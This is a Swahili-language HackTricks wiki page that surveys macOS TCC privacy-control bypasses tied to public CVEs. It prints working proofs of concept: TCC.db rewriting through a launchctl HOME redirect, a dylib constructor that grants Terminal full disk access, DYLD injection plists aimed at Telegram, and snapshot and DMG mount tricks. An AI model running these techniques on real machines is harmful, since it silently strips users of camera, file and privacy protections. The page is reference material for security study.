# Kupita kwa macOS TCC

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kwa kazi

### Kupita kwa Kuandika

Hii sio njia ya kupita, ni jinsi TCC inavyofanya kazi: **Haitoi ulinzi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji bado inaweza kuandika ndani yake**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Mkusanyiko wa muda mrefu `com.apple.macl`** huongezwa kwa **faili mpya** ili kumpa **app ya waundaji** upatikanaji wa kuisoma.

### TCC ClickJacking

Inawezekana kuweka **dirisha juu ya dirisha la TCC** ili kufanya mtumiaji **kukubali** bila kugundua. Unaweza kupata uthibitisho wa dhana katika [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Ombi la TCC kwa jina la kupindukia

Mshambuliaji anaweza **kuunda programu zenye jina lolote** (k.m. Finder, Google Chrome...) katika **`Info.plist`** na kufanya iombe upatikanaji wa eneo fulani lililolindwa na TCC. Mtumiaji atadhani kuwa programu halali ndiyo inayoomba upatikanaji huu. Zaidi ya hayo, inawezekana **kuondoa programu halali kutoka Dock na kuweka ile bandia**, hivyo mtumiaji akibofya ile bandia (ambayo inaweza kutumia alama ile ile) inaweza kuita ile halali, kuomba ruhusa za TCC na kutekeleza zisizo, hivyo kufanya mtumiaji aamini kuwa programu halali ndiyo iliyoomba upatikanaji.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na uthibitisho wa dhana katika:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### Kupuuza SSH

Kwa chaguo-msingi, upatikanaji kupitia **SSH ulikuwa na "Full Disk Access"**. Ili kulemaza hii unahitaji kuwa imeorodheshwa lakini imelemazwa (kuiondoa kwenye orodha haitaondoa ruhusa hizo):

![](<../../../../../.gitbook/assets/image (1074).png>)

Hapa unaweza kupata mifano ya jinsi baadhi ya **malware zimefanikiwa kukiuka kinga hii**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Tafadhali elewa kuwa sasa, ili kuweza kuwezesha SSH unahitaji **Full Disk Access**
{% endhint %}

### Kusimamia nyongeza - CVE-2022-26767

Mkusanyiko wa muda mrefu **`com.apple.macl`** unapewa faili ili kumpa **programu fulani ruhusa ya kuisoma.** Mkusanyiko huu unawekwa wakati wa **kuburuta na kuacha** faili juu ya programu, au wakati mtumiaji **anapobofya mara mbili** faili kufungua na programu ya **msingi**.

Hivyo, mtumiaji anaweza **kujiandikisha programu yenye nia mbaya** kusimamia nyongeza zote na kuita Huduma za Kuzindua kufungua **faili yoyote** (hivyo faili ya nia mbaya itapewa ruhusa ya kuisoma).

### iCloud

Kustahiki **`com.apple.private.icloud-account-access`** inawezekana kuwasiliana na huduma ya XPC ya **`com.apple.iCloudHelper`** ambayo itatoa **vibali vya iCloud**.

**iMovie** na **Garageband** walikuwa na kustahiki hii na zingine zilizoruhusiwa.

Kwa maelezo zaidi kuhusu udanganyifu wa **kupata vibali vya iCloud** kutoka kwa kustahiki hiyo, angalia mazungumzo: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Uendeshaji

Programu yenye **ruhusa ya `kTCCServiceAppleEvents`** itaweza **kudhibiti Programu nyingine**. Hii inamaanisha inaweza **kutumia vibali vilivyotolewa kwa Programu nyingine**.

Kwa maelezo zaidi kuhusu Skripti za Apple angalia:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Kwa mfano, ikiwa Programu ina **ruhusa ya Uendeshaji juu ya `iTerm`**, kama ilivyo katika mfano huu **`Terminal`** ina upatikanaji juu ya iTerm:

<figure><img src="../../../../../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

#### Juu ya iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kutekeleza vitendo:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Juu ya Finder

Au ikiwa Programu ina ufikiaji juu ya Finder, inaweza kuwa na script kama hii:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Kwa Tabia ya Programu

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**Tccd daemon** wa userland unatumia **`HOME`** **env** variable kufikia TCC users database kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) na kwa sababu daemon ya TCC inaendeshwa kupitia `launchd` ndani ya uwanja wa mtumiaji wa sasa, ni **inawezekana kudhibiti mazingira yote** yanayopitishwa kwake.\
Hivyo, **mshambuliaji anaweza kuweka `$HOME` mazingira** variable katika **`launchctl`** ili kuelekeza kwa **directory iliyodhibitiwa**, **kuanzisha upya** daemon ya **TCC**, na kisha **kurekebisha moja kwa moja TCC database** ili kujipa **kila ruhusa ya TCC inayopatikana** bila kuuliza mtumiaji mwisho.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Maelezo

Maelezo yalikuwa na ufikiaji wa maeneo yaliyolindwa na TCC lakini wakati maelezo yanapotengenezwa hii **hutengenezwa katika eneo lisilolindwa**. Kwa hivyo, ungeweza kuomba maelezo kuchukua faili iliyolindwa katika maelezo (hivyo katika eneo lisilolindwa) na kisha kupata ufikiaji wa faili:

<figure><img src="../../../../../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Uhamishaji

Binary `/usr/libexec/lsd` pamoja na maktaba `libsecurity_translocate` ilikuwa na ruhusa ya `com.apple.private.nullfs_allow` ambayo iliruhusu kuunda **nullfs** mount na ilikuwa na ruhusa ya `com.apple.private.tcc.allow` na **`kTCCServiceSystemPolicyAllFiles`** kufikia kila faili.

Ilikuwa inawezekana kuongeza sifa ya karantini kwa "Library", kuita huduma ya XPC ya **`com.apple.security.translocation`** na kisha itaunganisha Library na **`$TMPDIR/AppTranslocation/d/d/Library`** ambapo nyaraka zote ndani ya Library zingeweza **kufikiwa**.

### CVE-2023-38571 - Muziki & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muziki`** ina kipengele kizuri: Wakati inaendeshwa, ita **ingiza** faili zilizoporwa kwa **`~/Muziki/Muziki/Media.localized/Ongeza Moja kwa Muziki.localized`** kwenye "maktaba ya media" ya mtumiaji. Zaidi ya hayo, inaita kitu kama: **`rename(a, b);`** ambapo `a` na `b` ni:

* `a = "~/Muziki/Muziki/Media.localized/Ongeza Moja kwa Muziki.localized/faili_yangu.mp3"`
* `b = "~/Muziki/Muziki/Media.localized/Ongeza Moja kwa Muziki.localized/Haijaongezwa.localized/2023-09-25 11.06.28/faili_yangu.mp3`

Hii **`rename(a, b);`** inayotenda ni dhaifu kwa **Hali ya Mashindano**, kwani inawezekana kuweka faili bandia ya **TCC.db** ndani ya folda ya `Ongeza Moja kwa Muziki.localized` na kisha wakati folda mpya (b) inapoundwa kuiga faili, kufuta, na kuielekeza kwa **`~/Maktaba/Applikesheni Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Ikiwa **`SQLITE_SQLLOG_DIR="njia/folder"`** kimsingi inamaanisha kwamba **db yoyote iliyofunguliwa inakopiwa kwenye njia hiyo**. Katika CVE hii, udhibiti huu ulitumika vibaya kwa **kuandika** ndani ya **SQLite database** ambayo itafunguliwa na mchakato na FDA ya **TCC database**, na kisha kutumia **`SQLITE_SQLLOG_DIR`** na **symlink katika jina la faili** ili wakati huo database inapofunguliwa, **TCC.db ya mtumiaji inaandikwa upya** na ile iliyofunguliwa.\
**Maelezo zaidi** [**katika andiko**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **na** [**katika mazungumzo**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Ikiwa mazingira ya kimazingira **`SQLITE_AUTO_TRACE`** yameset, maktaba **`libsqlite3.dylib`** itaanza **kurekodi** maombi yote ya SQL. Programu nyingi za Apple zilitumia maktaba hii, hivyo ilikuwa inawezekana kurekodi maombi yote yao ya SQLite.

Programu kadhaa za Apple zilitumia maktaba hii kufikia habari zilizolindwa na TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Hii **variable ya mazingira hutumiwa na mfumo wa `Metal`** ambao ni tegemezi kwa programu mbalimbali, hasa `Music`, ambayo ina FDA.

Kuweka yafuatayo: `MTL_DUMP_PIPELINES_TO_JSON_FILE="njia/jina"`. Ikiwa `njia` ni saraka halali, kosa litazinduliwa na tunaweza kutumia `fs_usage` kuona kinachoendelea katika programu:

* faili itafunguliwa kwa `open()`, itaitwa `njia/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
* moja au zaidi ya `write()` itaandika maudhui kwenye faili (hatudhibiti hii)
* `njia/.dat.nosyncXXXX.XXXXXX` itabadilishwa jina kwa `rename()` kuwa `njia/jina`

Ni andishi la faili la muda, ikifuatiwa na **`rename(old, new)`** **ambayo si salama.**

Si salama kwa sababu inapaswa **kutatua njia za zamani na mpya kwa kujitegemea**, ambayo inaweza kuchukua muda na kuwa hatarini kwa Mashindano ya Hali. Kwa maelezo zaidi unaweza kuchunguza kazi ya `xnu` `renameat_internal()`.

{% hint style="danger" %}
Kwa hiyo, kimsingi, ikiwa mchakato uliopewa mamlaka unabadilisha jina kutoka kwenye folda unayodhibiti, unaweza kushinda RCE na kufanya iweze kufikia faili tofauti au, kama katika CVE hii, kufungua faili ambayo programu iliyopewa mamlaka imeunda na kuhifadhi FD.

Ikiwa kubadilisha jina kunafikia folda unayodhibiti, wakati umebadilisha faili ya chanzo au una FD kwake, unaweza kubadilisha faili ya marudio (au folda) kuashiria kiungo, ili uweze kuandika wakati wowote unavyotaka.
{% endhint %}

Hii ilikuwa shambulio katika CVE: Kwa mfano, kubadilisha `TCC.db` ya mtumiaji, tunaweza:

* kuunda `/Users/hacker/kiunganishi chetu` ili kuashiria `/Users/hacker/Library/Application Support/com.apple.TCC/`
* kuunda saraka `/Users/hacker/tmp/`
* kuweka `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* kuzindua kosa kwa kukimbia `Music` na hii variable ya mazingira
* kufuatilia `open()` ya `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
* hapa pia tunafungua faili hii kwa kuandika, na kushikilia nambari ya faili
* kubadilisha `/Users/hacker/tmp` kwa `/Users/hacker/kiunganishi chetu` **kwa mzunguko**
* tunafanya hivi ili kuongeza nafasi zetu za kufanikiwa kwani dirisha la mashindano ni dogo sana, lakini kupoteza mashindano hakuna hasara kubwa
* subiri kidogo
* jaribu kuona ikiwa tulifanikiwa
* ikiwa la, endesha tena kutoka mwanzo

Maelezo zaidi kwenye [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Sasa, ikiwa unajaribu kutumia variable ya mazingira `MTL_DUMP_PIPELINES_TO_JSON_FILE` programu hazitazinduliwa
{% endhint %}

### Apple Remote Desktop

Kama mtumiaji wa mizizi unaweza kuwezesha huduma hii na **ARD agent atakuwa na ufikivu kamili wa diski** ambao kisha unaweza kutumia vibaya kufanya ipige nakala ya **database mpya ya mtumiaji wa TCC**.

## Kwa **NFSHomeDirectory**

TCC hutumia database katika saraka ya HOME ya mtumiaji kudhibiti ufikivu wa rasilimali maalum kwa mtumiaji katika **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hivyo, ikiwa mtumiaji anafanikiwa kuanzisha upya TCC na variable ya mazingira ya $HOME ikielekeza kwa **saraka tofauti**, mtumiaji anaweza kuunda database mpya ya TCC katika **/Library/Application Support/com.apple.TCC/TCC.db** na kudanganya TCC kutoa ruhusa ya TCC kwa programu yoyote.

{% hint style="success" %}
Tafadhali kumbuka kuwa Apple hutumia mipangilio iliyohifadhiwa ndani ya wasifu wa mtumiaji katika sifa ya **`NFSHomeDirectory`** kwa **thamani ya `$HOME`**, kwa hivyo ikiwa unahatarisha programu na ruhusa ya kubadilisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kuifanya iwe silaha** na kosa la TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha saraka ya **HOME** ya mtumiaji.

1. Pata _csreq_ blob kwa programu ya lengo.
2. Panda faili bandia ya _TCC.db_ na ufikivu unaohitajika na blob ya _csreq_.
3. Toa kuingia kwa Huduma za Saraka za mtumiaji na [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha kuingia kwa Huduma za Saraka kubadilisha saraka ya nyumbani ya mtumiaji.
5. Ingiza kuingia kilichobadilishwa kwa Huduma za Saraka na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Acha _tccd_ ya mtumiaji na zima upya mchakato.

POC ya pili iliyotumia **`/usr/libexec/configd`** ambayo ilikuwa na `com.apple.private.tcc.allow` na thamani `kTCCServiceSystemPolicySysAdminFiles`.\
Ilikuwa inawezekana kuendesha **`configd`** na chaguo la **`-t`**, mshambuliaji angeweza kutaja **Bundle ya kawaida ya kupakia**. Kwa hivyo, kosa linachukua nafasi ya **`dsexport`** na **`dsimport`** ya kubadilisha saraka ya nyumbani ya mtumiaji na **kuingiza msimbo wa configd**.

Kwa maelezo zaidi angalia [**ripoti ya awali**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Kwa kuingiza mchakato

Kuna njia tofauti za kuingiza msimbo ndani ya mchakato na kutumia vibali vyake vya TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Zaidi ya hayo, njia ya kawaida zaidi ya kuingiza mchakato kwa kudanganya TCC iliyopatikana ni kupitia **plugins (kupakia maktaba)**.\
Vifaa vya ziada ni msimbo wa ziada kawaida katika fomu ya maktaba au plist, ambayo itapakia na kutekelezwa chini ya muktadha wake. Kwa hivyo, ikiwa programu kuu ilikuwa na ufikivu wa faili zilizozuiwa na TCC (kupitia ruhusa zilizotolewa au haki za kibali), **msimbo wa desturi pia utakuwa nao**.

### CVE-2020-27937 - Directory Utility

Programu `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na ruhusa ya **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia vifaa vya ziada na kielezo cha **`.daplug`** na **haikuwa na** runtime iliyohakikishwa.

Ili kuifanya CVE hii kuwa silaha, **`NFSHomeDirectory`** inabadilishwa (kwa kutumia ruhusa ya awali) ili kuweza **kuchukua database ya TCC ya mtumiaji** kudanganya TCC.

Kwa maelezo zaidi angalia [**ripoti ya awali**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Binaryi **`/usr/sbin/coreaudiod`** ilikuwa na ruhusa za `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **kuruhusu uingizaji wa nambari** na ya pili ikimpa ufikivu wa **kusimamia TCC**.

Binaryi hii iliruhusu kupakia **programu-jalizi za mtu wa tatu** kutoka kwenye folda `/Library/Audio/Plug-Ins/HAL`. Kwa hivyo, ilikuwa inawezekana **kupakia programu-jalizi na kutumia ruhusa za TCC** na hii PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Kwa maelezo zaidi angalia [**ripoti ya asili**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Vifaa vya Tabaka la Kujificha (DAL) Plug-Ins

Programu za mfumo ambazo hufungua mtiririko wa kamera kupitia Core Media I/O (programu zinazotumia **`kTCCServiceCamera`**) hulipakia **katika mchakato huu viendelezi** vilivyoko katika `/Library/CoreMediaIO/Plug-Ins/DAL` (sio kizuizi cha SIP).

Kuhifadhi tu huko maktaba na **ujenzi wa kawaida** kutafanya kazi kwa ajili ya **kuingiza msimbo**.

Programu kadhaa za Apple zilikuwa na mapungufu haya.

### Firefox

Programu ya Firefox ilikuwa na ruhusa za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Kwa habari zaidi kuhusu jinsi ya kutumia hii [**angalia ripoti ya asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambayo iliruhusu kuingiza namna ndani ya mchakato na kutumia TCC privileges.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo ilikuwa inawezekana kuitumia kwa **kupata ufikivu wa ruhusa zake** kama vile kurekodi kwa kutumia kamera. Unaweza [**kupata mzigo katika andiko**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Tafadhali angalia jinsi ya kutumia env variable kwa kupakia maktaba **plist ya desturi** ilibuniwa kuingiza maktaba hii na **`launchctl`** ilitumika kuizindua:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Kwa mwaliko wa wazi

Inawezekana kuita **`open`** hata wakati wa kufungwa kwenye sanduku

### Skripti za Terminali

Ni kawaida kutoa **Upatikanaji Kamili wa Diski (FDA)** kwa terminal, angalau kwenye kompyuta zinazotumiwa na watu wa teknolojia. Na inawezekana kuita skripti za **`.terminal`** kuitumia hiyo.

Skripti za **`.terminal`** ni faili za plist kama hii yenye amri ya kutekelezwa kwenye ufunguo wa **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Programu inaweza kuandika script ya terminal katika eneo kama /tmp na kuizindua na amri kama:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Kwa kufunga

### CVE-2020-9771 - kufunga_apfs TCC kuepuka na upandishaji wa mamlaka

**Mtumiaji yeyote** (hata wasio na mamlaka) wanaweza kuunda na kufunga picha ya wakati wa mashine na **kupata FAILI ZOTE** za picha hiyo.\
**Mamlaka pekee** inayohitajika ni kwa programu iliyotumiwa (kama vile `Terminal`) kuwa na **Ufikiaji Kamili wa Diski** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambao unahitaji kupewa na msimamizi.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Maelezo zaidi yanaweza [**kupatikana kwenye ripoti ya asili**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Kufunika juu ya faili ya TCC

Hata kama faili ya TCC DB ililindwa, ilikuwa inawezekana **kufunika juu ya saraka** faili mpya ya TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Angalia **exploit kamili** katika [**maandishi ya awali**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Zana ya **`/usr/sbin/asr`** iliruhusu kunakili diski nzima na kuimount mahali pengine kwa kuzingilia kinga za TCC.

### Huduma za Mahali

Kuna database ya tatu ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja wanaoruhusiwa kupata **huduma za mahali**.\
Folda ya **`/var/db/locationd/` haikulindwa kutokana na DMG mounting** hivyo ilikuwa inawezekana kuimount plist yetu.

## Kupitia programu za kuanza

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Kupitia grep

Kwa mara kadhaa faili zitahifadhi taarifa nyeti kama barua pepe, namba za simu, ujumbe... katika maeneo yasiyolindwa (ambayo ni mapungufu katika Apple).

<figure><img src="../../../../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

## Bonyeza ya Kisynthetic

Hii haifanyi kazi tena, lakini [**ilifanya kazi hapo awali**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Njia nyingine kutumia [**matukio ya CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (27).png" alt="" width="563"><figcaption></figcaption></figure>

## Marejeo

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Njia za Kupitisha Mifumo yako ya Faragha ya macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Ushindi wa Kupigana na TCC - 20+ Njia MPYA za Kupitisha Mifumo yako ya Faragha ya MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
